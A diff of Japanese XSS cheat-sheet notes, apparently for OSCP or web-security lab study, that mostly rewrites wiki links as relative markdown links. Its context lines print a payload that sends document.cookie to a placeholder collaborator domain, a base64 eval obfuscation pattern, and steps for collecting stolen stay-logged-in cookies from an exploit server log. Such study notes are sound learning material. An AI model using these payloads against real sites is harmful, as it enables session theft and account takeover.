@@ -18,8 +18,8 @@ fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
 ```
 eval(atob("base64エンコードした上記2つのペイロード"))
 ```
-[[Web攻撃の難読化#base64 encoding]]
-[[🔍 Recon#⭐️URLエンコードについて]]
+[Web攻撃の難読化](../../../OSCP/Cheatsheet/Stealth&Evasion/Web攻撃の難読化.md#base64%20encoding)
+[🔍 Recon](../../cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)
 
 ---
 ### 基本形
@@ -28,15 +28,15 @@ eval(atob("base64エンコードした上記2つのペイロード"))
 
 ###### HTMLへのXSS : Tag is not allowed || Event is not allowed
 
-- [[4. XSS contexts#HTMLタグ内でのXSS]]のHTMLタグ内のXSSメソドロジーかも
+- [4. XSS contexts](4.%20XSS%20contexts.md#HTMLタグ内でのXSS)のHTMLタグ内のXSSメソドロジーかも
 
 ###### インプットがHTMLエンコードされる
 
-[[4. XSS contexts#引用符がエスケープされるケース]]
+[4. XSS contexts](4.%20XSS%20contexts.md#引用符がエスケープされるケース)
 
 ###### JavaScript内部へのXSS
 
-- [[4. XSS contexts#JavaScriptへのXSS]]
+- [4. XSS contexts](4.%20XSS%20contexts.md#JavaScriptへのXSS)
 
 ###### Stay-logged-in Cookieを取得
 
@@ -48,7 +48,7 @@ eval(atob("base64エンコードした上記2つのペイロード"))
 ```
 
 2. エクスプロイトサーバのAccess logを確認し、Cookieを入手する
-3. [[⚡️Authentication#Stay-logged-inから入る場合]]へ
+3. [⚡️Authentication](../../Server-side/Authentication/⚡️Authentication.md#Stay-logged-inから入る場合)へ
 
 ---
 ### OAST
